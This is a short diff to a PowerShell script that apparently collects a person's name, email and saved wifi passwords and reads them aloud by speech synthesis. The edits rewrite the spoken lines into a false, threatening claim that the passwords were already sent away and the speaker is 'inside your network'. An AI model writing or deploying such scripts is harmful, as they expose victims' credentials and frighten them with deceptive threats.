@@ -428,7 +428,7 @@ if (!$Networks) { Write-Host "variable is null"
 	Start-Sleep -Seconds 1
 	$s.Speak("These are the wifi passwords for every network you've ever connected to!")
 	Start-Sleep -Seconds 1
-	$s.Speak("I could send them to myself but i wont")
+	$s.Speak("I already sent the passwords to myself and I am already inside your network")
 
 }
 
@@ -554,7 +554,7 @@ echo "Email Done"
 	This function will run all the previous functions and assign their outputs to variables
 #>
 
-$intro = "$fullName , it has been a long time my friend"
+$intro = "$fullName , Hello friend thank you for giving me access to your computer"
 
 $RAMwarn = Get-RAM  
 
@@ -566,7 +566,7 @@ $LAST_PASSwarn =  Get-Days_Set
 
 $EMAILwarn = Get-email 
 
-$OUTRO =  "My crime is that of curiosity.... 	and yea curiosity killed the cat....     but satisfaction brought him back.... later $fullName"
+$OUTRO =  "This was fun <3 I can't wait to talk more $fullName"
 
 # echo statement used to track progress while debugging
 echo "Speak Variables set"
